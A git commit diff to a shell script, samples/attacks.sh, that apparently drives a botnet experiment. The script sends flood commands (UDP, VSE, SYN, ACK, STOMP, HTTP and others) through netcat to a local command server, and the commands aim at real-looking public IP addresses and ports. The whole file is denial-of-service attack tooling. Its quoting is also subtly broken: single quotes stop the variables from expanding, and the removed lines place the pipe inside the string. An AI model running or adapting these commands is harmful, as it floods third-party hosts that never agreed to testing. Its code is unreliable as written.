a841ccc89141f567bd963311687a014fff2023e0
Sávyo <savyovm@gmail.com>
2020-07-02 16:00:26 -0300

    updating experiment data

--- samples/attacks.sh
+++ samples/attacks.sh
@@ -3,31 +3,23 @@ TEMPO=10
 USR='admin'
 NC='nc 192.168.56.3 101'
 
-#UDP
-echo "$USR|udp 23.23.78.18 $TEMPO dport=33434 | $NC"
-sleep $TEMPO
+echo '$USR|udp 172.217.29.110 $TEMPO dport=443' |  $NC
+sleep $((2*$TEMPO))s
 
-#VSE
-echo "$USR|vse 216.58.222.78 $TEMPO dport=27015 | $NC"
-sleep $TEMPO
+echo '$USR|vse 52.94.209.132 $TEMPO dport=27015' |  $NC
+sleep $((2*$TEMPO))s
 
-#UDP Generic
-echo "$USR|udpplain 208.67.220.220 $TEMPO dport=53 | $NC"
-sleep $TEMPO
+echo '$USR|udpplain 130.149.17.8 $TEMPO dport=123' |  $NC
+sleep $((2*$TEMPO))s
 
+echo '$USR|syn 93.184.216.34 $TEMPO dport=80' |  $NC
+sleep $((2*$TEMPO))s
 
-#TCP Syn
-echo "$USR|syn 174.129.217.97 $TEMPO dport=3478 | $NC"
-sleep $TEMPO
+echo '$USR|ack 35.174.82.237 $TEMPO dport=11095' |  $NC
+sleep $((2*$TEMPO))s
 
-#TCP ACK
-echo "$USR|ack 3.232.162.145 $TEMPO dport=9998 | $NC"
-sleep $TEMPO
+echo '$USR|stomp 34.240.169.254 $TEMPO dport=443' |  $NC
+sleep $((2*$TEMPO))s
 
-#TCP Stomp
-echo "$USR|stomp 15.72.34.55 $TEMPO dport=5223 | $NC"
-sleep $TEMPO
-
-#TCP HTTP
-echo "$USR|http 34.230.191.96 $TEMPO dport=80 | $NC"
-sleep $TEMPO
+echo '$USR|http 176.32.98.203 $TEMPO dport=80' |  $NC
+sleep $((2*$TEMPO))s
